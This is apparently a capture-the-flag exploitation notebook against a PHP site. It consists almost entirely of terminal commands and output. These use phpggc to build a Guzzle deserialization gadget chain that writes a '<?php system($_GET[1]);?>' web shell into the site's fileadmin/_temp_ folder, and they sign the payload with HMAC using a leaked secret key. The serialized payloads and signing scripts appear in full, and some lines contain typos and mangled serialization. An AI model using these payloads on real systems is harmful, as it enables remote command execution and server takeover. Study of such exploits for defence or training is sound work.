$secret = hash_mac('sha1', 'YToyOntpOjc7TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czo0MToiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAZmlsZW5hbWUiO3M6NTA6Ii92YXIvd3d3L2h0bWwvcHVibGljL2ZpbGVhZG1pbi9fdGVtcF8vYmFja2Rvb3IucGhwIjtzOjUyOiIAR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphcgBzdG9yZVNlc3Npb25Db29raWVzIjtiOjE7czozNjoiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBjb29raWVzIjthOjE6e2k6MDtPOjI3OiJHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUiOjE6e3M6MzM6IgBHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUAZGF0YSI7YTozOntzOjc6IkV4cGlyZXMiO2k6MTtzOjc6IkRpc2NhcmQiO2I6MDtzOjU6IlZhbHVlIjtzOjI2OiI8P3BocCBzeXN0ZW0oJF9HRVRbMV0pOz8+CiI7fX19czozOToiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBzdHJpY3RNb2RlIjtOO31pOjc7aTo3O30=', ' '712dd4d9c583482940b75514e31400c11bdcbc7374c8e62fff958fcd80e8353490b0fdcf4d0ee25b40cf81f523609c0b');
print($secret);
?>
```


./phpggc -b --fast-destruct Guzzle/FW1 /var/www/html/fileadmin/_temp_/exp.php 


<p>----------------------------------</p>
<p>2025, October 26</p>

<img width="1061" height="442" alt="image" src="https://github.com/user-attachments/assets/7462dd75-6c3b-4712-80bc-b7412f7f7342" />



<?php
$sig = hash_hmac('sha384', $argv[1], "712dd4d9c583482940b75514e31400c11bdcbc7374c8e62fff958fcd80e8353490b0fdcf4d0ee25b40cf81f523609c0b");
print($sig);
?>




:~/Enterprize/phpggc# ./phpggc -b --fast-destruct Guzzle/FW1 /var/wwww/html/public/fileadmin/_temp_/backdoor.php /root/Enterprize/phpggc/aux.php
YToyOntpOjc7TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czo0MToiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAZmlsZW5hbWUiO3M6NTE6Ii92YXIvd3d3dy9odG1sL3B1YmxpYy9maWxlYWRtaW4vX3RlbXBfL2JhY2tkb29yLnBocCI7czo1MjoiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAc3RvcmVTZXNzaW9uQ29va2llcyI7YjoxO3M6MzY6IgBHdXp6bGVIdHRwXENvb2tpZVxDb29raWVKYXIAY29va2llcyI7YToxOntpOjA7TzoyNzoiR3V6emxlSHR0cFxDb29raWVcU2V0Q29va2llIjoxOntzOjMzOiIAR3V6emxlSHR0cFxDb29raWVcU2V0Q29va2llAGRhdGEiO2E6Mzp7czo3OiJFeHBpcmVzIjtpOjE7czo3OiJEaXNjYXJkIjtiOjA7czo1OiJWYWx1ZSI7czoyNjoiPD9waHAgc3lzdGVtKCRfR0VUWzFdKTs/PgoiO319fXM6Mzk6IgBHdXp6bGVIdHRwXENvb2tpZVxDb29raWVKYXIAc3RyaWN0TW9kZSI7Tjt9aTo3O2k6Nzt9


HMAC  SHA1



SHA1 : 4c21422bd05aaaaff87defd1016c7b203399270e

:~/Enterprize/phpggc# cat aux.php
<?php system($_GET[1]);?>


# cat aux.js
a:2:{i:7;O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:36:"GuzzleHttp\Cookie\CookieJarCookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:33:".GuzzleHttp\Cookie\SetCookie.data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:26:"<?php system($_GET[1]);?>";}}}s:39:".GuzzleHttp\Cookie\CookieJarstrictMode";N;s:41:"GuzzleHttp\Cookie\FileCookieJarFilnemae";s:50:"/var/html/public/fileadmin/_temp_/backdoor.php";s:52:"GuzzleHttp\Cookie\FileCookieSessionCookies";b:1;}i:7;i:7;}



:~/Enterprize/phpggc# cat aux.php
<?php $output = system($_GET[1]); echo $output ; ?>



:~/Enterprize/phpggc# ./phpggc -b --fast-destruct Guzzle/FW1 /var/wwww/html/public/fileadmin/_temp_/aux.php /root/Enterprize/phpggc/aux.php
YToyOntpOjc7TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czo0MToiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAZmlsZW5hbWUiO3M6NDY6Ii92YXIvd3d3dy9odG1sL3B1YmxpYy9maWxlYWRtaW4vX3RlbXBfL2F1eC5waHAiO3M6NTI6IgBHdXp6bGVIdHRwXENvb2tpZVxGaWxlQ29va2llSmFyAHN0b3JlU2Vzc2lvbkNvb2tpZXMiO2I6MTtzOjM2OiIAR3V6emxlSHR0cFxDb29raWVcQ29va2llSmFyAGNvb2tpZXMiO2E6MTp7aTowO086Mjc6Ikd1enpsZUh0dHBcQ29va2llXFNldENvb2tpZSI6MTp7czozMzoiAEd1enpsZUh0dHBcQ29va2llXFNldENvb2tpZQBkYXRhIjthOjM6e3M6NzoiRXhwaXJlcyI7aToxO3M6NzoiRGlzY2FyZCI7YjowO3M6NToiVmFsdWUiO3M6NTI6Ijw/cGhwICRvdXRwdXQgPSBzeXN0ZW0oJF9HRVRbMV0pOyBlY2hvICRvdXRwdXQgOyA/PgoiO319fXM6Mzk6IgBHdXp6bGVIdHRwXENvb2tpZVxDb29raWVKYXIAc3RyaWN0TW9kZSI7Tjt9aTo3O2k6Nzt9



:~/Enterprize/phpggc# cat script.php
<?php
echo hash_hmac('sha1', 'YToyOntpOjc7TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czo0MToiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAZmlsZW5hbWUiO3M6NDY6Ii92YXIvd3d3dy9odG1sL3B1YmxpYy9maWxlYWRtaW4vX3RlbXBfL2F1eC5waHAiO3M6NTI6IgBHdXp6bGVIdHRwXENvb2tpZVxGaWxlQ29va2llSmFyAHN0b3JlU2Vzc2lvbkNvb2tpZXMiO2I6MTtzOjM2OiIAR3V6emxlSHR0cFxDb29raWVcQ29va2llSmFyAGNvb2tpZXMiO2E6MTp7aTowO086Mjc6Ikd1enpsZUh0dHBcQ29va2llXFNldENvb2tpZSI6MTp7czozMzoiAEd1enpsZUh0dHBcQ29va2llXFNldENvb2tpZQBkYXRhIjthOjM6e3M6NzoiRXhwaXJlcyI7aToxO3M6NzoiRGlzY2FyZCI7YjowO3M6NToiVmFsdWUiO3M6NTI6Ijw/cGhwICRvdXRwdXQgPSBzeXN0ZW0oJF9HRVRbMV0pOyBlY2hvICRvdXRwdXQgOyA/PgoiO319fXM6Mzk6IgBHdXp6bGVIdHRwXENvb2tpZVxDb29raWVKYXIAc3RyaWN0TW9kZSI7Tjt9aTo3O2k6Nzt9', '712dd4d9c583482940b75514e31400c11bdcbc7374c8e62fff958fcd80e8353490b0fdcf4d0ee25b40cf81f523609c0b');
?>


:~/Enterprize/phpggc# php script.php
0363a381be6878cf3e68acf0c83164642938bcd2


<img width="1120" height="674" alt="image" src="https://github.com/user-attachments/assets/52ab6cc1-93dc-45f6-a2b1-4d24d63f7926" />


<img width="847" height="254" alt="image" src="https://github.com/user-attachments/assets/eac23ae1-4425-44ee-a87c-c2fde960541f" />




<img width="1123" height="357" alt="image" src="https://github.com/user-attachments/assets/231d6aee-0fad-4e5e-953f-abb33929a809" />


<img width="1122" height="357" alt="image" src="https://github.com/user-attachments/assets/cba0417a-d12d-4a29-8fb0-747008b02e12" />


a:2:{i:7;O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:36:"GuzzleHttp\Cookie\CookieJarCookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:33:".GuzzleHttp\Cookie\SetCookie.data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:26:"<?php system($_GET[1]);?>";}}}s:39:".GuzzleHttp\Cookie\CookieJarstrictMode";N;s:41:"GuzzleHttp\Cookie\FileCookieJarFilnemae";s:50:"/var/html/public/fileadmin/_temp_/backdoor.php";s:52:"GuzzleHttp\Cookie\FileCookieSessionCookies";b:1;}i:7;i:7;}
